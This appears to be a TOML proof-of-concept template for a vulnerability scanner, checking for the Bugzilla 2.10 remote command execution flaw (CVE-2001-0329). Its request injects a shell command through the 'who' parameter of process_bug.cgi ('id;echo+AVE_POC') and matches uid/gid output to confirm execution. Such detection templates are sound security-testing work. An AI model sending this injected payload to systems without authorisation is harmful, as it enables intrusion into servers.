[info]
author = "ave"
description = "验证 Bugzilla 2.10 远程命令执行漏洞（CVE-2001-0329）。通过 process_bug.cgi 的 who 参数注入 shell 元字符，检测服务器是否执行了任意命令。"
id = "POC-AVE-2001-0145"
name = "Bugzilla 远程命令执行漏洞 PoC"
severity = "high"
tags = ["ave-2001-0145"]
vuln_id = [
    "CVE-2001-0329",
    "AVE-2001-0145",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/process_bug.cgi"
protocol = "http"
query = "who=id;echo+AVE_POC"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
    "AVE_POC",
]
